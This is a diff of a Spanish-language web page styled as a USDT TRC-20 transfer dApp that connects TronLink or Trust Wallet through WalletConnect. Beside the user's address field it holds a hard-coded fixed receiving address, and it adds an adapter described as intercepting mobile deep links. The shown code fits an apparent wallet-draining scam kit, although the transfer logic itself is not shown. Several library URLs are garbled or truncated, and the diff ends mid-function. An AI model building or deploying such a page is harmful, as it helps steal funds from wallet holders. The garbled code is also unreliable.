@@ -3,9 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp USDT TRC-20 - Transferencia Segura</title>
+    <title>dApp USDT TRC-20 - Transferencia de Saldo</title>
     
-    <!-- Estilos CSS de la Interfaz -->
+    <!-- ============================================================
+         ESTILOS INTERFAZ GRÁFICA (CSS)
+         ============================================================ -->
     <style>
         * {
             box-sizing: border-box;
@@ -143,15 +145,24 @@
         .log-item { margin-bottom: 6px; padding-bottom: 4px; border-bottom: 1px solid #1e293b; }
     </style>
 
-    <!-- Carga de las dependencias oficiales Web3 -->
+    <!-- ============================================================
+         DEPENDENCIAS WEB3 Y REDIRECCIÓN COMPLETA A TRUST WALLET
+         ============================================================ -->
     <script src="https://jsdelivr.net"></script>
     <script type="module">
         import { createAppKit } from 'https://esm.sh'
         import { tron } from 'https://esm.sh/networks'
+        import { WagmiAdapter } from 'https://esm.sh-adapter-wagmi'
 
-        // Inicialización de WalletConnect v2 (Reown AppKit)
+        // Inicializamos el adaptador necesario para interceptar Deep Links móviles
+        const wagmiAdapter = new WagmiAdapter({
+            networks: [tron],
+            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT' // Reemplazar con ID de ://walletconnect.com
+        });
+
+        // Configuración avanzada del Modal con soporte nativo para Trust Wallet móvil
         const modal = createAppKit({
-            adapters: [],
+            adapters: [wagmiAdapter], 
             networks: [tron],
             metadata: {
                 name: 'dApp USDT TRC-20',
@@ -159,7 +170,12 @@
                 url: window.location.origin,
                 icons: ['https://githubusercontent.com']
             },
-            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT' // Coloca tu Project ID obtenido en ://walletconnect.com
+            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT',
+            features: {
+                analytics: false,
+                email: false,     
+                socials: false    
+            }
         });
         window.WalletConnectModal = modal;
     </script>
@@ -205,12 +221,14 @@
         </div>
     </div>
 
-    <!-- LÓGICA DE APLICACIÓN COMPLETA -->
+    <!-- ============================================================
+         LÓGICA UNIFICADA DE LA APLICACIÓN (JAVASCRIPT)
+         ============================================================ -->
     <script>
         document.addEventListener('DOMContentLoaded', function () {
             'use strict';
 
-            // Elementos del DOM
+            // Referencias del DOM
             const btn = document.getElementById('connectBtn');
             const input = document.getElementById('amountInput');
             const addressInput = document.getElementById('addressInput');
@@ -220,17 +238,17 @@
             const pasteBtn = document.querySelector('.address-action.paste');
             const logContent = document.getElementById('logContent');
 
-            // Estado de control
+            // Variables de Estado Interno
             let procesoEnCurso = false;
-            let activeProviderType = null; // 'tronlink' o 'walletconnect'
+            let activeProviderType = null; 
             let connectedAddress = null;
 
-            // Constantes Globales de Red
-            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de USDT en TRON Mainnet
+            // CONFIGURACIÓN DE BLOQUE
+            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT Oficial en TRON Mainnet
             const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
 
             // ============================================================
-            // MANEJO DE ESTADOS DE LA INTERFAZ
+            // MANEJO DE ESTADOS DE LA INTERFAZ VISUAL
             // ============================================================
             function setStatus(message, type = '') {
                 if (!status) return;
@@ -254,21 +272,3 @@
                 logContent.appendChild(item);
                 document.getElementById('techLogger').scrollTop = document.getElementById('techLogger').scrollHeight;
             }
-
-            function isValidTronAddress(address) {
-                if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) return false;
-                try {
-                    if (typeof TronWeb !== 'undefined' && typeof TronWeb.isAddress === 'function') {
-                        return TronWeb.isAddress(address);
-                    }
-                } catch (e) {}
-                return true;
-            }
-
-            // ============================================================
-            // CONEXIÓN INTEGRADA (TronLink / Trust Wallet)
-            // ============================================================
-            async function connect() {
-                if (window.tronLink || window.tronWeb) {
-                    if (window.tronLink && typeof window.tronLink.request === 'function') {
-                        const response = await window.tronLink.request({ method: 'tron_requestAccounts' });
